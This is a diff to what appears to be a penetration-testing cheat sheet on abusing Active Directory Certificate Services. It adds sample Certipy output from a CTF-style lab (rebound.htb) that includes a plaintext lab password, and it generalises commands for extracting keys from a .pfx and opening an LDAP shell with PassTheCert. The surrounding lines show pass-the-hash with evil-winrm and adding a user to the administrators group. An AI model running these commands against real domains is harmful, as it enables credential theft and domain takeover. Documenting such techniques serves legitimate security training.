@@ -89,6 +89,18 @@ get-adcstemplate | fl displayname
 certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca <CA> -template User -target <DC> -pfx <USER>.pfx
 ```
 
+```console {class="sample-code"}
+$ certipy-ad req -u 'oorend@rebound.htb' -p '1GR8t@$$4u' -ca rebound-DC01-CA -template User -target dc01.rebound.htb -pfx oorend.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 7
+[*] Got certificate with UPN 'oorend@rebound.htb'
+[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-7682'
+[*] Saved certificate and private key to 'oorend.pfx'
+```
+
 #### 2. Get NTLM hash
 
 ```console
@@ -365,11 +377,11 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 #### 1. Create key and cert from pfx
 
 ```console
-certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
+certipy-ad cert -pfx <USER>.pfx -nocert -out <USER>.key
 ```
 
 ```console
-certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
+certipy-ad cert -pfx <USER>.pfx -nokey -out <USER>.crt
 ```
 
 {{< tab set8 tab1 active >}}LDAP Shell{{< /tab >}}
@@ -379,7 +391,7 @@ certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
 #### 1. Get a LDAP shell
 
 ```console
-python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
+python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt <USER>.crt -key <USER>.key -domain <DOMAIN> -dc-ip <DC>
 ```
 
 #### 2. Add user to administrators group
